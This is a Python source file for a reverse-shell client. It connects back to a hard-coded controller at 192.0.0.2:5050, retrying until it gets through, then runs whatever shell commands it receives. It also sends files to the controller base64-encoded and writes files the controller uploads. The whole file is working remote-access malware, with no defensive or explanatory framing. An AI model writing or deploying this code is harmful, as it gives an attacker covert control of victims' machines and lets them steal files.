import socket
import subprocess
import json
import os
import base64
import sys
import time

class Client:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.connection.connect((ip, port))
                break
            except ConnectionRefusedError:
                time.sleep(2) 
    def change_dir(self,path):
        os.chdir(path)
        return "changing dir --> "+path
        
    def read_file(self,path):
        with open(path,"rb") as file:
            data=file.read()
            return base64.b64encode(data).decode()
    def write_file(self,filename,content):
        with open(filename,"wb") as file:
               file.write(base64.b64decode(content))
               return filename +" Uploaded "

    def box_send(self, data):
        json_data = json.dumps(data) + "\n"
        self.connection.sendall(json_data.encode())

    def box_receive(self):
        data = ""
        while True:
            chunk = self.connection.recv(1024).decode()
            if not chunk:
                break
            data += chunk
            if "\n" in data:
                break
        return json.loads(data.strip())

    def execute_cmd(self, cmd):
        NULL = open(os.devnull,"wb")
        return subprocess.check_output(str(cmd), shell=True,stderr=NULL,stdin=NULL)

    def run(self):
        while True:
            cmd = self.box_receive()
            try:
                if cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif cmd[0] == "cd"and len(cmd)>1:
                    result =self.change_dir(cmd[1])
                elif cmd[0] =="download" and len(cmd)>1:
                    result=self.read_file(cmd[1])
                elif cmd[0]== "upload":
                    result =self.write_file(cmd[1],cmd[2])
                else:
                    if len(cmd)>1:
                        cmd=" ".join(cmd)
                        result = self.execute_cmd(cmd).decode(errors="ignore")
                    else:
                        result = self.execute_cmd(cmd[0]).decode(errors="ignore")
                
                
            except Exception:
                    result = " ∆ Error occured while running command"
            self.box_send(result)

client = Client("192.0.0.2", 5050)
client.run()
